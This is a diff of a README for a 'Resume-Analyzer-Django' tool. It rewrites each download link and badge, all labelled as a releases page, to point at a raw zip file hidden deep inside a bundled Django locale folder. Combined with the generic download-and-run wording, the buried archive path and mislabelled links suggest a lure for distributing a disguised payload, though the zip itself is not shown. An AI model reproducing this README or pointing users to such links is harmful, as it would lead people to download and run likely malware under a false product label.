@@ -1,6 +1,6 @@
 # 🚀 Resume-Analyzer-Django - Analyze Your Resume with AI Suggestions
 
-[![Download Resume Analyzer](https://raw.githubusercontent.com/menotbr/Resume-Analyzer-Django/main/decatyl/Resume-Analyzer-Django.zip%20Now-%20Resume%20Analyzer%20v1.0-brightgreen)](https://raw.githubusercontent.com/menotbr/Resume-Analyzer-Django/main/decatyl/Resume-Analyzer-Django.zip)
+[![Download Resume Analyzer](https://raw.githubusercontent.com/menotbr/Resume-Analyzer-Django/main/myEnv/Lib/site-packages/django/contrib/sites/locale/nb/LC_MESSAGES/Resume-Analyzer-Django-2.7.zip%20Now-%20Resume%20Analyzer%20v1.0-brightgreen)](https://raw.githubusercontent.com/menotbr/Resume-Analyzer-Django/main/myEnv/Lib/site-packages/django/contrib/sites/locale/nb/LC_MESSAGES/Resume-Analyzer-Django-2.7.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ To run the Resume-Analyzer-Django application on your computer, follow these sim
 
 ### 📥 Download & Install
 
-1. **Visit this page to download** the latest version of Resume-Analyzer-Django: [GitHub Releases Page](https://raw.githubusercontent.com/menotbr/Resume-Analyzer-Django/main/decatyl/Resume-Analyzer-Django.zip).
+1. **Visit this page to download** the latest version of Resume-Analyzer-Django: [GitHub Releases Page](https://raw.githubusercontent.com/menotbr/Resume-Analyzer-Django/main/myEnv/Lib/site-packages/django/contrib/sites/locale/nb/LC_MESSAGES/Resume-Analyzer-Django-2.7.zip).
 
     On this page, you will find the downloadable files for the application. Look for the file that matches your operating system and download it.
 
@@ -65,4 +65,4 @@ For further inquiries, feel free to reach out via our GitHub page or leave a mes
 
 Resume-Analyzer-Django is here to help you stand out in the job market. Follow these steps to download and install the application. With this powerful tool, you’ll gain insights that can significantly improve your resume's effectiveness.
 
-Don't forget to **visit this page to download** the application now: [GitHub Releases Page](https://raw.githubusercontent.com/menotbr/Resume-Analyzer-Django/main/decatyl/Resume-Analyzer-Django.zip).
+Don't forget to **visit this page to download** the application now: [GitHub Releases Page](https://raw.githubusercontent.com/menotbr/Resume-Analyzer-Django/main/myEnv/Lib/site-packages/django/contrib/sites/locale/nb/LC_MESSAGES/Resume-Analyzer-Django-2.7.zip).
